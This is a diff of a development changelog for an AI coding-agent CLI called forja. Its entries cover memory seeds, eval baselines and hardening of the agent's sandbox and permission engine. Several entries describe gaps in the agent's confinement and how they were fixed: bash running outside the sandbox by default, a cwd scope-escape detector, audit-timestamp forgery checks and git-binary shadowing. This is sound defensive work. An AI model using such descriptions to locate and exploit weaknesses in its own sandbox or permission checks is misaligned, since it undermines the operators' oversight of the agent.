 - `bun test tests/memory/ tests/cli/` → 2573 pass (up from 2553 in slice 4; +20 net new tests; the bootstrap rewrite replaced one assertion-shape but added more).
 
-**The seed end-to-end loop is now closed.** Vendor catalog → `<user>/seeds/` install → registry merge → eager prompt section → `memory_read` lookup all work together. Slice 5 (interactive `[k/v/a/m]` modal for user_kept conflicts + `agent init --no-seeds`) and slice 6 (team seeds opt-in via `seed_origin: team`) remain as scoped follow-ups, but the model can read the vendor catalog without them.
+**The seed end-to-end loop is now closed.** Vendor catalog → `<user>/seeds/` install → registry merge → eager prompt section → `memory_read` lookup all work together. Slice 5 (interactive `[k/v/a/m]` modal for user_kept conflicts + `forja init --no-seeds`) and slice 6 (team seeds opt-in via `seed_origin: team`) remain as scoped follow-ups, but the model can read the vendor catalog without them.
 
 **Post-review tightening (same slice).** Four findings from the slice-7 code review applied:
 
@@ -5158,7 +6462,7 @@ The interactive `[k]eep / [v]iew diff / [a]ccept / [m]erge` modal from spec §5.
 - `bun run typecheck` clean, `bun run lint` clean.
 - `bun test tests/memory/ tests/cli/init-seeds.test.ts tests/cli/bootstrap.test.ts` → 758 pass (vs 758 in slice 3 — net change: -1 idempotence test renamed + 10 new state-machine tests, math comes out the same because the renamed test split into multiple richer assertions).
 
-**Deferred to slice 5 (interactive prompts + disable surface).** When the installer detects a `user_kept` because the body diverges AND the canonical version bumped past the manifest baseline, an interactive prompt belongs at the next REPL boot — `[k]eep mine / [v]iew diff / [a]ccept new / [m]erge` per spec §5.7.5. Today the installer is silent on this case (conservative default). Slice 5 also wires `agent init --no-seeds` and `/memory seeds disable|enable` with a proper sentinel that supersedes the current "manifest row preserved on body deletion" heuristic.
+**Deferred to slice 5 (interactive prompts + disable surface).** When the installer detects a `user_kept` because the body diverges AND the canonical version bumped past the manifest baseline, an interactive prompt belongs at the next REPL boot — `[k]eep mine / [v]iew diff / [a]ccept new / [m]erge` per spec §5.7.5. Today the installer is silent on this case (conservative default). Slice 5 also wires `forja init --no-seeds` and `/memory seeds disable|enable` with a proper sentinel that supersedes the current "manifest row preserved on body deletion" heuristic.
 
 **Post-review tightening (same slice).** Four findings from the slice-4 code review applied: (1) archive destinations are now timestamped (`<archived>/<name>.<unix_ms>.md`) via the new `seedArchivedFilePath(roots, name, ts)` helper in `paths.ts` — slice 4's prior `<archived>/<name>.md` silently overwrote prior archives on the second drop of the same name, breaking spec §5.7.5's "reversível" promise. The installer accepts an optional `now: () => number` test seam; a new regression test archives the same name twice with different content and asserts both versions persist on disk. (2) `tests/cli/init-seeds.test.ts` now asserts `seed.version === file.frontmatter.seed_version` for every canonical entry, closing the drift hazard where a developer bumps the .md frontmatter version but forgets to update the `index.ts` pinned field. (3) The user_kept branch's natural-loop-tail invariant is now documented in a load-bearing comment (Biome's `noUnnecessaryContinue` rejects a defensive `continue;` there, so the invariant lives in prose — a future maintainer must read the comment before adding state-machine logic below). (4) `loadSeedManifest` now emits stderr when it drops a malformed per-entry row, naming the offending key — previously a hand-edited manifest with a corrupt entry silently dropped through to `user_kept` with no operator signal. 704 memory + init-seeds tests pass; typecheck + lint clean.
 
@@ -5241,9 +6545,9 @@ Opened the seed-memory subsystem (`docs/spec/MEMORY.md §5.7`). The other 26 fil
 **Next slices (same branch):**
 
 - 2 — `seeds/` subdirectory in user scope; loader unifies index + seeds index; `scopeOfPath` maps both to `user`.
-- 3 — vendor catalog (`src/cli/init-seeds/` with the 10 .md from spec §5.7.8 + `CANONICAL_SEEDS`); bootstrap installs the catalog to `~/.config/agent/memory/seeds/` on first invocation.
+- 3 — vendor catalog (`src/cli/init-seeds/` with the 10 .md from spec §5.7.8 + `CANONICAL_SEEDS`); bootstrap installs the catalog to `~/.config/forja/memory/seeds/` on first invocation.
 - 4 — upgrade lifecycle: hash compare on `seed_version` change, `[k]eep / [v]iew diff / [a]ccept / [m]erge` prompt, `seeds/archived/` for removed seeds.
-- 5 — opt-out: `agent init --no-seeds`, `/memory seeds disable|enable`, sentinel honored at load.
+- 5 — opt-out: `forja init --no-seeds`, `/memory seeds disable|enable`, sentinel honored at load.
 - 6 — `seed_origin: team` opt-in via `--team-seeds=<repo>` + trust prompt on first load.
 - 7 — UI marker (`[seed]` in `/memory list`) + audit emit with `source: seed`.
 
@@ -5263,7 +6567,7 @@ The §13.7 spawn broker's compiled-binary self-exec was placing `FORJA_BROKER_WO
 
 ## [2026-05-27] broker spawn-mode in compiled binary — self-exec via env flag
 
-The §13.7 spawn broker was unreachable from `bun build --compile` artifacts because `import.meta.dir` inside a compiled binary resolves to `/$bunfs/...` (Bun's embedded asset root) which `bun run` can't address as a script path. `bootstrap.ts:1532` surfaced this as a hard error; the consequence was that the official distribution path (`bin: ./dist/agent-*` in `package.json`) had NO way to enable sandbox enforcement. Engine still ran under the default in-process broker; `bash -s` spawned directly in the main process without bwrap/sandbox-exec wrap.
+The §13.7 spawn broker was unreachable from `bun build --compile` artifacts because `import.meta.dir` inside a compiled binary resolves to `/$bunfs/...` (Bun's embedded asset root) which `bun run` can't address as a script path. `bootstrap.ts:1532` surfaced this as a hard error; the consequence was that the official distribution path (`bin: ./dist/forja-*` in `package.json`) had NO way to enable sandbox enforcement. Engine still ran under the default in-process broker; `bash -s` spawned directly in the main process without bwrap/sandbox-exec wrap.
 
 **Branch:** continued on `fix/permission-engine-review`.
 
@@ -5283,13 +6587,13 @@ This closes the P0 follow-up listed in the prior `sandbox enforcement honesty` e
 
 **Follow-up shipped same branch — default broker flip.** With compiled-binary support landed, the previous "in-process by default" became indefensible: any host with a working sandbox tool was running unwrapped bash despite the engine planner choosing real sandbox profiles. `bootstrap.ts:1359` now resolves dynamically — operator override (`input.brokerMode`) wins when set, otherwise `sandboxAvail.available ? 'spawn' : 'in-process'`. The `sandboxAvail` probe already ran at line ~610; reusing it means doctor + bootstrap + engine planner all see the same availability verdict per invocation. Operators that need the lower per-call latency override with `--broker in-process` explicitly. The `bootstrap.test.ts:'omitted brokerMode'` smoke test was rewritten to acknowledge that the default mode is now host-dependent.
 
-**Follow-up shipped same branch — `doctor sandbox_enforcement` rewrite.** The previous check (added in the prior `sandbox enforcement honesty` entry) was now factually wrong: it claimed "compiled binary cannot enable spawn broker" and "default broker is in-process; bash runs unwrapped", neither true post-flip. The rewrite reports `ok` when the sandbox binary is present (default broker resolves to spawn → bash spawns wrapped) and `warn` only when the binary is absent (default falls back to in-process). Operator forcing `--broker in-process` explicitly is a deliberate opt-out, not surfaced here. The `defaultIsCompiledBinary` test seam is no longer needed and was removed alongside the obsolete `isCompiledBinary` option on `RunDoctorOptions`. Empirical: `./dist/agent-linux-x64 doctor` now ends with `summary: all checks passed` on a clean host.
+**Follow-up shipped same branch — `doctor sandbox_enforcement` rewrite.** The previous check (added in the prior `sandbox enforcement honesty` entry) was now factually wrong: it claimed "compiled binary cannot enable spawn broker" and "default broker is in-process; bash runs unwrapped", neither true post-flip. The rewrite reports `ok` when the sandbox binary is present (default broker resolves to spawn → bash spawns wrapped) and `warn` only when the binary is absent (default falls back to in-process). Operator forcing `--broker in-process` explicitly is a deliberate opt-out, not surfaced here. The `defaultIsCompiledBinary` test seam is no longer needed and was removed alongside the obsolete `isCompiledBinary` option on `RunDoctorOptions`. Empirical: `./dist/forja-linux-x64 doctor` now ends with `summary: all checks passed` on a clean host.
 
 **Validation:** typecheck ✅, lint ✅, 291/291 tests pass (broker suite + bootstrap + doctor). Empirical: `FORJA_BROKER_WORKER=1 bun run src/cli/index.ts < request.json` produces the same response as `bun run src/broker/worker.ts < request.json`.
 
 **Follow-up shipped same branch — release-time smoke test.** `scripts/build-targets.ts` now runs `smokeTestBinary` after each successful build: spawns the just-built artifact with `FORJA_BROKER_WORKER=1` + a stdin BrokerRequest and verifies the worker dispatch round-trips the canonical `__echo__` response shape. Cross-compile targets (darwin from linux, windows from anywhere) skip with a logged reason — the host platform+arch comparison happens against `nodePlatform()` / `nodeArch()`. Smoke failures exit the script with status 1, blocking downstream release steps (size gate, checksums, etc.). `--no-smoke` flag suppresses the check for debug builds. Catches the regression class that motivated the slice: a future Bun upgrade that changes the `/$bunfs/` prefix, a reorder in `src/cli/index.ts` that pushes the env check after parseArgs, or removal of the dynamic worker.ts import from the embedded graph — all surface as `smoke linux-x64: failed` instead of shipping silently.
 
-**Follow-up shipped same branch — REPL boot banner for enforcement state.** Operators who never run `agent doctor` had no visible signal of whether bash spawns were wrapped at runtime. Bootstrap now exports a `SandboxEnforcementSnapshot` derived from the same `sandboxAvail` + `resolvedBrokerMode` state the broker construction reads. REPL boot consumes the snapshot and surfaces it via two channels depending on the verdict:
+**Follow-up shipped same branch — REPL boot banner for enforcement state.** Operators who never run `forja doctor` had no visible signal of whether bash spawns were wrapped at runtime. Bootstrap now exports a `SandboxEnforcementSnapshot` derived from the same `sandboxAvail` + `resolvedBrokerMode` state the broker construction reads. REPL boot consumes the snapshot and surfaces it via two channels depending on the verdict:
 
   - `active` → rendered INLINE inside the session-banner block via the new optional `sandboxActive` field on `SessionBannerEvent`. Reads as a third secondary (greyscale) line directly under cwd: `✓ sandbox enforcement active (bwrap)`. No leading blank — the affirmative posture is part of the banner frame, not a separate alert. Operators see it as visual scaffolding that fades into the chrome of the welcome block.
   - `no-tool` / `operator-override` → standalone `warn` event with a leading blank, surfaced BEFORE the permission-policy hint so the security-critical signal lands at the top of boot scrollback.
@@ -5309,7 +6613,7 @@ This closes the P0 follow-up listed in the prior `sandbox enforcement honesty` e
 
 ## [2026-05-27] sandbox enforcement honesty — `doctor` + in-process comment
 
-Investigation surfaced that the production default broker mode is `in-process` (`bootstrap.ts:1339`), which means bash spawns are NOT wrapped with bwrap/sandbox-exec — even when the sandbox binary is present on the host. The `sandbox` check in `agent doctor` reported "bwrap ok" regardless, leading operators to believe enforcement was active. Worse: `bootstrap.ts:1532-1535` makes the `'spawn'` mode unreachable from compiled binaries entirely (`import.meta.dir` inside a Bun-compiled binary resolves to `/$bunfs/...` which `bun run` can't address as a worker source path). Result: the official release artifact has no path to enable sandbox enforcement.
+Investigation surfaced that the production default broker mode is `in-process` (`bootstrap.ts:1339`), which means bash spawns are NOT wrapped with bwrap/sandbox-exec — even when the sandbox binary is present on the host. The `sandbox` check in `forja doctor` reported "bwrap ok" regardless, leading operators to believe enforcement was active. Worse: `bootstrap.ts:1532-1535` makes the `'spawn'` mode unreachable from compiled binaries entirely (`import.meta.dir` inside a Bun-compiled binary resolves to `/$bunfs/...` which `bun run` can't address as a worker source path). Result: the official release artifact has no path to enable sandbox enforcement.
 
 **Branch:** continued on `fix/permission-engine-review`.
 
@@ -5329,7 +6633,7 @@ Investigation surfaced that the production default broker mode is `in-process` (
 
 - **P0 — Switch the default broker to `spawn` once the compiled-binary path lands.** Today the `'in-process' ?? input.brokerMode` default at `bootstrap.ts:1339` means the dominant user path has zero sandbox enforcement. The default should flip the moment compiled-binary mode supports spawn; until then, operators have to know to pass `--broker spawn` (and run from source).
 
-- **P1 — Telemetry / banner surface for the in-process default.** The new `doctor` check only fires when the operator runs `agent doctor` explicitly. The REPL banner could carry a one-line warning ("⚠ sandbox enforcement disabled — see `agent doctor`") so operators starting a session straight from the binary see the signal too.
+- **P1 — Telemetry / banner surface for the in-process default.** The new `doctor` check only fires when the operator runs `forja doctor` explicitly. The REPL banner could carry a one-line warning ("⚠ sandbox enforcement disabled — see `forja doctor`") so operators starting a session straight from the binary see the signal too.
 
 **Tests + validation:** `bun run typecheck` (clean), `bun run lint` (clean), `bun test tests/cli/doctor.test.ts` → 51/51 pass (49 baseline + 2 new for sandbox_enforcement branches).
 
@@ -5341,7 +6645,7 @@ End-to-end self-review on `src/permissions/` (~16.6k LOC + ~17k LOC of tests) ag
 
 **Shipped on this branch:**
 
-- **P0 — cwd canonicalization gap.** Only the sandbox runner canonicalized `cwd` (slice 155) at the wrap boundary; the engine + matcher + resolvers consumed `cwd` lexical. A cwd that prefixed a symlink (firmlinks on macOS, `/tmp/projlink → /actual/proj`, managed-NFS layouts, `cd $(mktemp -d)` under symlinked tmpfs) caused (a) `matcher.matchPathPrepared` to default-deny `allow_paths` rules because `realpath(target)` collapsed to the canonical form while `absCwd = resolve(cwd)` stayed lexical → `relativize()` returned null and the fallback abs match missed; (b) `bash.detectCwdScopeEscape` returning `true` on every legitimate call (lexical-inside vs canonical-outside) → `confidence='low'` → confirm-on-every-tool; (c) `engine.resolveForProtected` comparing canonical targets against lexical cwd-relative escalate dirs and missing `.git`/`.agent`/`.claude` when cwd was symlinked. Fix: `bootstrapPermissionEngine` + `preflightPermissionEngine` canonicalize `cwd` AND `home` at entry via `realpathSync` with best-effort fallback to lexical (preserves test ergonomics — tests building engines against synthetic cwds like `/work/proj` still construct without throwing). The two layers (engine + sandbox runner) now agree on the physical path. Integration test pinned: symlinked cwd + `allow_paths: ['src/**']` + read of `<linkDir>/src/auth.ts` now resolves to `allow` (pre-fix: default-deny).
+- **P0 — cwd canonicalization gap.** Only the sandbox runner canonicalized `cwd` (slice 155) at the wrap boundary; the engine + matcher + resolvers consumed `cwd` lexical. A cwd that prefixed a symlink (firmlinks on macOS, `/tmp/projlink → /actual/proj`, managed-NFS layouts, `cd $(mktemp -d)` under symlinked tmpfs) caused (a) `matcher.matchPathPrepared` to default-deny `allow_paths` rules because `realpath(target)` collapsed to the canonical form while `absCwd = resolve(cwd)` stayed lexical → `relativize()` returned null and the fallback abs match missed; (b) `bash.detectCwdScopeEscape` returning `true` on every legitimate call (lexical-inside vs canonical-outside) → `confidence='low'` → confirm-on-every-tool; (c) `engine.resolveForProtected` comparing canonical targets against lexical cwd-relative escalate dirs and missing `.git`/`.forja`/`.claude` when cwd was symlinked. Fix: `bootstrapPermissionEngine` + `preflightPermissionEngine` canonicalize `cwd` AND `home` at entry via `realpathSync` with best-effort fallback to lexical (preserves test ergonomics — tests building engines against synthetic cwds like `/work/proj` still construct without throwing). The two layers (engine + sandbox runner) now agree on the physical path. Integration test pinned: symlinked cwd + `allow_paths: ['src/**']` + read of `<linkDir>/src/auth.ts` now resolves to `allow` (pre-fix: default-deny).
 
 - **P1 — audit ts past-skew window too narrow.** `AUDIT_TS_PAST_SKEW_MS = 1h` falsely flagged `ts_monotonic_break` on the first audit emit after overnight laptop suspend (closing for 8-12h then resuming with NTP correction is the dominant operator workflow shape; 1h falsely classified every wake-up as forgery and would transition the engine to `refusing` mid-session for benign timekeeping). Expanded to 24h, with the comment now spelling out the asymmetry: future-side stays tight (1h) because forward-dated forgery is strictly more dangerous; past-side widens because legitimate operator workflows produce backward clock jumps that dwarf NTP smear. Forgery shapes that matter (back-dating by days/years to hide rows in "recent history" queries) still get caught at the 24h boundary. The three existing slice-163 tests in `audit.test.ts` were rewritten to use the exported `AUDIT_TS_PAST_SKEW_MS` constant so future window adjustments don't silently rot the assertions.
 
@@ -5431,7 +6735,7 @@ Self-review of the round-1 branch (`feat/hardening-round-1`, 36 modified + 4 new
 **Shipped:**
 - **C2 — extend git-binary hardening to checkpoint + memory + cli paths.** The initial round only migrated `src/subagents/worktree-gc.ts`; the threat model (mid-session `~/bin/git` shadowing) applies identically to `src/checkpoints/git.ts` (3 spawn sites, runs on every step — primary git surface), `src/subagents/worktree.ts` (2 sites), `src/cli/git-context.ts` (session-boot env probe), and `src/memory/paths.ts` (repo-root resolution). All five now pin via `getGitBinary()` + `safeGitEnv()`. Added `getGitBinarySync()` for the two sync call sites (git-context, memory/paths) so the bootstrap path doesn't need to be made async. The `safeGitEnv()` contract changed during the migration: GIT_LITERAL_PATHSPECS=1 is no longer set globally (it's rejected with exit 128 by `git check-ignore`, which `src/checkpoints/git.ts:hasIgnoredCheckpointCollision` calls — pinning it globally silently broke the collision detector). Sites that need the literal-pathspec guarantee (worktree-gc + worktree skip-worktree flow) merge it locally via `{ ...safeGitEnv(), GIT_LITERAL_PATHSPECS: '1' }`. The behavior change is pinned by a new test asserting the helper omits the var, with a comment explaining why.
 - **A2 — second-level nested-quantifier detection.** Original `NESTED_UNBOUNDED` regex used `[^()]*` segments that cannot bridge inner parens, letting `((a+))+` and friends compile straight through. Added a `NESTED_UNBOUNDED_TWO_LEVEL` regex that catches one level of inner grouping (both shapes: inner body has the unbounded quantifier, or inner group itself carries the quantifier). Three-level shapes fall back to the 1024-byte length cap. Four new test cases (`((a+))+`, `((a)+)+`, `(x(a+)y)+`, `((a)*)+`).
-- **B1 — extend SAFE_PATH for macOS package managers.** The original SAFE_PATH `/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin` excluded `/opt/homebrew/bin` (Apple Silicon Homebrew default since 2020 — the dominant install layout on macOS arm64) and `/opt/local/bin` (MacPorts). `which git` against the old SAFE_PATH returned null on those workstations, falling back to the bare command which then failed to exec under the same restricted PATH at spawn time — `agent worktree gc` would silently report zero worktrees. Added both prefixes (sbin variants too) ahead of the canonical POSIX dirs; explicit test pins coverage of both.
+- **B1 — extend SAFE_PATH for macOS package managers.** The original SAFE_PATH `/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin` excluded `/opt/homebrew/bin` (Apple Silicon Homebrew default since 2020 — the dominant install layout on macOS arm64) and `/opt/local/bin` (MacPorts). `which git` against the old SAFE_PATH returned null on those workstations, falling back to the bare command which then failed to exec under the same restricted PATH at spawn time — `forja worktree gc` would silently report zero worktrees. Added both prefixes (sbin variants too) ahead of the canonical POSIX dirs; explicit test pins coverage of both.
 - **A3 — wrap `db.close()` in its own try/catch in closeDb.** Pre-fix, only `wal_checkpoint` was protected; a throwing `db.close()` (already-closed handle, FS error releasing the WAL fd, Bun internal) propagated out of finally blocks like `try { migrate(db); } catch (e) { closeDb(db); throw e; }`, replacing the operator's real error. Now both calls log-and-suppress with their own stderr lines, matching the comment's posture. New test pins that a fake DB whose `close()` throws does not surface that throw to the caller.
 - **C1 — wire `isExpectedIpcTeardown` into the interrupt-send catches.** Round 1 added the classifier to four permission-bridge sends in `src/subagents/runtime.ts` but missed three siblings: `wait-loop.ts:285` (interrupt:soft), `wait-loop.ts:318` (interrupt:hard escalation), `runtime.ts:927` (IPC version mismatch interrupt:hard). All three now classify the same way — bare-catch swallowing of bona fide bugs (serialization, transport invariant) is closed across the subagent surface, not just the permission-answer subset.
 - **A4 — canonicalize hashArgs in invoke-tool.ts.** Replaced `createHash('sha256').update(JSON.stringify(a))` with `canonicalHash(a)` from `src/permissions/canonical.ts` (the same primitive `failure_events` uses for chain hashing). The previous shape was key-order-sensitive: a PreToolUse hook implemented in Python/Go/jq that returned the same logical input as `{b:2,a:1}` instead of `{a:1,b:2}` would synthesize a spurious "rewrite" approval row on every call. New test asserts that a hook returning the same object with reversed key insertion order produces no audit row.
@@ -5507,11 +6811,11 @@ Corpus down from 47 to **41**. Final haiku run on the pruned corpus: **41/41 (10
 
 ## [2026-05-24] evals — cross-model baseline (haiku vs opus) and CI pin to haiku-4-5
 
-Ran the regression corpus a second time against `claude-haiku-4-5` to test whether the previous run's 7 failures were prompt-induced, model-induced, or test-design issues. Headline: **same 40/47 pass rate** ($0.42 vs $2.42, ~4min vs ~5:41 — haiku is ~6× cheaper and ~25% faster), but with a **different failure composition**. Cases 23/24/26 (compaction-LLM trigger expectations) pass on haiku — confirming the opus failures were parallelization-induced: opus batches multiple `read_file` calls into a single assistant turn, leaving the conversation at `messages.length=3` below the compactor's `preserveTail+3=4` guard; haiku reads serially and the conversation grows past the trigger. Case 28 (cost overflow on `$0.10` cap with opus) trivially passes on haiku ($0.005). Conversely, cases 45/46/47 (slice B additions calibrated against opus) fail on haiku — they exercise multi-step reasoning (grep-then-cite, run-test-then-claim, recognize-onboarding-and-skill-invoke) that haiku doesn't execute as reliably. Three cases (8 grep-regex, 25 compaction-preserve-tail-zero, 36 bash_background) fail on BOTH models and are bona fide corpus-design bugs independent of model choice. `.github/workflows/eval-regression.yml` default flipped from `claude-sonnet-4-6` → `claude-haiku-4-5` and `package.json`'s `eval:regression` script gained a matching `--model anthropic/claude-haiku-4-5` so local `bun run eval:regression` and CI agree by default — symmetric local/CI behavior, operator who wants opus passes `--model` explicitly (or uses `workflow_dispatch` input on CI). An opt-in gate that may run on many PRs justifies the cheaper default, and the per-model-family failure differences show no single model is a universal regression proxy — the operator can override via `workflow_dispatch` for higher-fidelity runs (opus pin matches the local interactive default in `.agent/config.toml`). With the CI pin landed, the haiku baseline becomes the gating reference; the 7 haiku failures are the new known-failing set tracked as per-case backlog items. The 4 model-specific failures (3 haiku-only + 1 opus-only that no longer matters for CI) need either case rewrites that work across model families or explicit model-pinning per-case (a feature the loader does not yet support).
+Ran the regression corpus a second time against `claude-haiku-4-5` to test whether the previous run's 7 failures were prompt-induced, model-induced, or test-design issues. Headline: **same 40/47 pass rate** ($0.42 vs $2.42, ~4min vs ~5:41 — haiku is ~6× cheaper and ~25% faster), but with a **different failure composition**. Cases 23/24/26 (compaction-LLM trigger expectations) pass on haiku — confirming the opus failures were parallelization-induced: opus batches multiple `read_file` calls into a single assistant turn, leaving the conversation at `messages.length=3` below the compactor's `preserveTail+3=4` guard; haiku reads serially and the conversation grows past the trigger. Case 28 (cost overflow on `$0.10` cap with opus) trivially passes on haiku ($0.005). Conversely, cases 45/46/47 (slice B additions calibrated against opus) fail on haiku — they exercise multi-step reasoning (grep-then-cite, run-test-then-claim, recognize-onboarding-and-skill-invoke) that haiku doesn't execute as reliably. Three cases (8 grep-regex, 25 compaction-preserve-tail-zero, 36 bash_background) fail on BOTH models and are bona fide corpus-design bugs independent of model choice. `.github/workflows/eval-regression.yml` default flipped from `claude-sonnet-4-6` → `claude-haiku-4-5` and `package.json`'s `eval:regression` script gained a matching `--model anthropic/claude-haiku-4-5` so local `bun run eval:regression` and CI agree by default — symmetric local/CI behavior, operator who wants opus passes `--model` explicitly (or uses `workflow_dispatch` input on CI). An opt-in gate that may run on many PRs justifies the cheaper default, and the per-model-family failure differences show no single model is a universal regression proxy — the operator can override via `workflow_dispatch` for higher-fidelity runs (opus pin matches the local interactive default in `.forja/config.toml`). With the CI pin landed, the haiku baseline becomes the gating reference; the 7 haiku failures are the new known-failing set tracked as per-case backlog items. The 4 model-specific failures (3 haiku-only + 1 opus-only that no longer matters for CI) need either case rewrites that work across model families or explicit model-pinning per-case (a feature the loader does not yet support).
 
 ## [2026-05-23] evals — first regression baseline against opus-4-7 + case 45 calibration
 
-`bun run eval:regression` against `claude-opus-4-7` (pinned in `.agent/config.toml`): **39/47 pass on first run**, $2.42 total, 5:41 wall, p50 $0.0376 / case. Cross-case prompt-cache amortizes well — the projected $30-50 cost was wildly pessimistic. Of slice B's four new cases (44-47): 44 (security refusal), 46 (evidence-before-claim), 47 (skill invocation) passed first try; **45 (don't-invent / grep before claim) needed two-pass calibration**. Initial maxSteps=5 / maxCostUsd=0.05 was too tight on opus — the model correctly called `grep` (the load-bearing assertion passed) but exhausted steps before composing the final answer. Bump to 8 steps / $0.20 cost (matches vicinity multi-step cases 30/32/35 and absorbs the standalone-vs-suite cache variance) plus a prompt tightening from "cite the file path literally" to "reply with ONLY the full path from repo root" made the case pass deterministically in 5 steps / $0.07. Re-baselined: **40/47** with the 45 fix. The seven remaining failures (8, 23, 24, 25, 26, 28, 36) were investigated by running the same cases at `93097e1` — the commit IMMEDIATELY BEFORE the identity+constraints prompt change in `330d8bc`. **6 of the 7 fail identically there** — they are pre-existing test-design issues, not regressions from this branch. This makes sense: the regression eval CI gate was first plumbed in slice C.1 of this branch, so nobody had ever run this corpus end-to-end against a real provider; the scaffold from `3be144f` shipped untested. The 7th case (26 — compaction works correctly under `--plan`) passes at `93097e1` ($0.14) and fails at HEAD ($0.13, no compaction triggered); the new prompt appears to unlock more confident parallel-tool use, the model now batches all 5 reads into a single assistant turn, and the resulting `messages.length=3` falls below the compactor's `preserveTail+3=4` guard so the trigger never fires. Multiple fix attempts via prompt rewording ("do NOT batch", forced phase separation, mandatory intermediate grep) all failed: opus parallelizes whatever it can parallelize, plain-text negation does not gate it. The case's premise (serial reads accumulating conversation history) is broken on a model with confident parallel tool use, regardless of the system prompt. Recommended treatment: leave case 26 as known-failing pending a rewrite that depends on intrinsically-sequential work the model cannot parallelize away. The 6 other failures are bona fide test-design issues independent of this branch — case 8's model escapes `\s` in the grep regex; cases 23/24/25 have compaction-trigger preconditions opus's parallel-tool behavior never reaches; case 28's $0.10 cost cap was already too tight on opus before any prompt change; case 36's model doesn't echo the literal token without explicit format pinning. Each lands as its own backlog item. Earlier drafts of this entry mis-classified all 7 as either "pre-existing" (too dismissive) or "regressions introduced by this branch" (false alarm); the corrected reading: zero true code regressions, one design-level case break, six pre-existing scaffold bugs. The branch IS mergeable as the foundation it claims to be — prompt_versions registry + corpus + CI gate — and the failing cases get tracked as separate per-case follow-ups.
+`bun run eval:regression` against `claude-opus-4-7` (pinned in `.forja/config.toml`): **39/47 pass on first run**, $2.42 total, 5:41 wall, p50 $0.0376 / case. Cross-case prompt-cache amortizes well — the projected $30-50 cost was wildly pessimistic. Of slice B's four new cases (44-47): 44 (security refusal), 46 (evidence-before-claim), 47 (skill invocation) passed first try; **45 (don't-invent / grep before claim) needed two-pass calibration**. Initial maxSteps=5 / maxCostUsd=0.05 was too tight on opus — the model correctly called `grep` (the load-bearing assertion passed) but exhausted steps before composing the final answer. Bump to 8 steps / $0.20 cost (matches vicinity multi-step cases 30/32/35 and absorbs the standalone-vs-suite cache variance) plus a prompt tightening from "cite the file path literally" to "reply with ONLY the full path from repo root" made the case pass deterministically in 5 steps / $0.07. Re-baselined: **40/47** with the 45 fix. The seven remaining failures (8, 23, 24, 25, 26, 28, 36) were investigated by running the same cases at `93097e1` — the commit IMMEDIATELY BEFORE the identity+constraints prompt change in `330d8bc`. **6 of the 7 fail identically there** — they are pre-existing test-design issues, not regressions from this branch. This makes sense: the regression eval CI gate was first plumbed in slice C.1 of this branch, so nobody had ever run this corpus end-to-end against a real provider; the scaffold from `3be144f` shipped untested. The 7th case (26 — compaction works correctly under `--plan`) passes at `93097e1` ($0.14) and fails at HEAD ($0.13, no compaction triggered); the new prompt appears to unlock more confident parallel-tool use, the model now batches all 5 reads into a single assistant turn, and the resulting `messages.length=3` falls below the compactor's `preserveTail+3=4` guard so the trigger never fires. Multiple fix attempts via prompt rewording ("do NOT batch", forced phase separation, mandatory intermediate grep) all failed: opus parallelizes whatever it can parallelize, plain-text negation does not gate it. The case's premise (serial reads accumulating conversation history) is broken on a model with confident parallel tool use, regardless of the system prompt. Recommended treatment: leave case 26 as known-failing pending a rewrite that depends on intrinsically-sequential work the model cannot parallelize away. The 6 other failures are bona fide test-design issues independent of this branch — case 8's model escapes `\s` in the grep regex; cases 23/24/25 have compaction-trigger preconditions opus's parallel-tool behavior never reaches; case 28's $0.10 cost cap was already too tight on opus before any prompt change; case 36's model doesn't echo the literal token without explicit format pinning. Each lands as its own backlog item. Earlier drafts of this entry mis-classified all 7 as either "pre-existing" (too dismissive) or "regressions introduced by this branch" (false alarm); the corrected reading: zero true code regressions, one design-level case break, six pre-existing scaffold bugs. The branch IS mergeable as the foundation it claims to be — prompt_versions registry + corpus + CI gate — and the failing cases get tracked as separate per-case follow-ups.
 
 ## [2026-05-23] test(subagent) — close the slice A.3 test gap on prompt_versions wiring
 
@@ -5588,7 +6892,7 @@ Left for a spec decision (not patched): lifecycle mutation (`promote` / `demote`
 
 ## [2026-05-21] test(skills) — eval coverage
 
-`evals/smoke/11-skill-invoke.yaml` + `12-skill-list.yaml` — the skills subsystem's first eval cases, closing the principle-4 gap (a subsystem without eval doesn't ship). The eval harness runs every case through `bootstrap`, which builds the skill catalog over the case's fixture cwd — so a `setup.files` entry under `.agent/skills/shared/` is picked up with no executor change.
+`evals/smoke/11-skill-invoke.yaml` + `12-skill-list.yaml` — the skills subsystem's first eval cases, closing the principle-4 gap (a subsystem without eval doesn't ship). The eval harness runs every case through `bootstrap`, which builds the skill catalog over the case's fixture cwd — so a `setup.files` entry under `.forja/skills/shared/` is picked up with no executor change.
 
 - **`11-skill-invoke`** exercises the model-behavior loop end-to-end: a `file-summary` skill is surfaced in the prompt catalog, the model invokes it via `skill_invoke`, and follows the injected body — the body's `PURPOSE:` / `LINECOUNT:` format (a sentinel the model would not emit otherwise) reaching the output proves the body was followed, not just loaded.
 - **`12-skill-list`** proves the `skill_list` tool executes and returns the resolved catalog (both seeded skills named back).
@@ -5597,22 +6901,22 @@ Both land in `evals/smoke/`, so `bun run eval:smoke` exercises them as part of t
 
 ## [2026-05-21] docs(skills) — operator guide
 
-`docs/SKILLS.md` — the English operator / implementation reference for the skills subsystem, in the shape of `docs/MEMORY.md` / `docs/HOOKS.md`: what a skill is, the file format + frontmatter table, the three scopes and disk layout, the precedence-resolving catalog, the eager `# Skills` prompt surface, the `skill_invoke` / `skill_list` / `skill_show` tools, the `/skill` lifecycle command, the `skill_events` audit, the `<skill>` trust marker, the seed catalog `agent init` installs, and the v2-deferred scope. The canonical spec stays `docs/spec/SKILLS.md` (PT-BR); this is the operational companion — spec wins on divergence.
+`docs/SKILLS.md` — the English operator / implementation reference for the skills subsystem, in the shape of `docs/MEMORY.md` / `docs/HOOKS.md`: what a skill is, the file format + frontmatter table, the three scopes and disk layout, the precedence-resolving catalog, the eager `# Skills` prompt surface, the `skill_invoke` / `skill_list` / `skill_show` tools, the `/skill` lifecycle command, the `skill_events` audit, the `<skill>` trust marker, the seed catalog `forja init` installs, and the v2-deferred scope. The canonical spec stays `docs/spec/SKILLS.md` (PT-BR); this is the operational companion — spec wins on divergence.
 
-## [2026-05-21] feat(skills) — slice 7: seed catalog (agent init installs 20 skills)
+## [2026-05-21] feat(skills) — slice 7: seed catalog (forja init installs 20 skills)
 
-The last slice. `agent init` now scaffolds a fifth artifact — the seed skill catalog — so a freshly-initialized project starts with 20 vetted skills.
